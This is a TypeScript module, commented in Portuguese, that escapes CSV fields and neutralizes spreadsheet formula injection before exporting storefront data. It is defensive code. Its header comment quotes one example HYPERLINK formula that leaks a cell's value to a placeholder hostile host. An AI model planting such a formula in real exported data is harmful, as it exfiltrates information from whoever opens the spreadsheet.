/**
 * Escapa um campo para CSV.
 *
 * Duas coisas distintas acontecem aqui.
 *
 * **1. Escape de CSV.** Qualquer valor com vírgula, aspas ou quebra de linha precisa vir
 * entre aspas, com as aspas internas dobradas. Sem isso um cliente chamado "Silva, João"
 * ou um produto 'Kit 2" azul' desloca as colunas a partir daquela linha.
 *
 * **2. Neutralização de fórmula.** Excel e Google Sheets tratam um campo que começa com
 * `=`, `+`, `-` ou `@` como **fórmula**, não como texto. Um nome valendo
 * `=HYPERLINK("http://mal/"&A1,"clique")` vira código executado no computador de quem
 * abre a planilha.
 *
 * Isso não importava enquanto tudo que o sistema exporta tinha sido digitado pelo próprio
 * dono. Deixa de ser verdade com o pedido da vitrine, em que **nome e observação vêm de um
 * visitante anônimo** e vão parar na tela do dono — e daí para o CSV. O apóstrofo à frente
 * é a convenção que as duas planilhas entendem como "isto é texto".
 */
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/;

/** `-12,50` e `-0.3` são número, não fórmula — o sistema exporta lucro negativo. */
const NUMERO = /^[+-]?\d+([.,]\d+)?$/;

export function escaparCampo(valor: string | number | null | undefined): string {
  const bruto = String(valor ?? "");
  const ehFormula = typeof valor !== "number" && INICIO_DE_FORMULA.test(bruto) && !NUMERO.test(bruto);
  const texto = ehFormula ? `'${bruto}` : bruto;
  return /[",\n\r]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto;
}

/** Objetos + lista de colunas (a coluna também é o cabeçalho). */
export function paraCsv(linhas: Record<string, string | number>[], colunas: string[]): string {
  const cabecalho = colunas.map(escaparCampo).join(",");
  const corpo = linhas.map((linha) => colunas.map((c) => escaparCampo(linha[c])).join(",")).join("\n");
  return `${cabecalho}\n${corpo}`;
}

/** Matriz de linhas já montadas, para relatórios com seções de larguras diferentes. */
export function matrizParaCsv(linhas: (string | number)[][]): string {
  return linhas.map((campos) => campos.map(escaparCampo).join(",")).join("\n");
}

export function baixarArquivo(nome: string, conteudo: string, tipo = "text/csv;charset=utf-8;") {
  // BOM na frente: sem ele o Excel em pt-BR abre o arquivo como ANSI e todo acento vira lixo.
  const blob = new Blob([`﻿${conteudo}`], { type: tipo });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = nome;
  a.click();
  URL.revokeObjectURL(url);
}
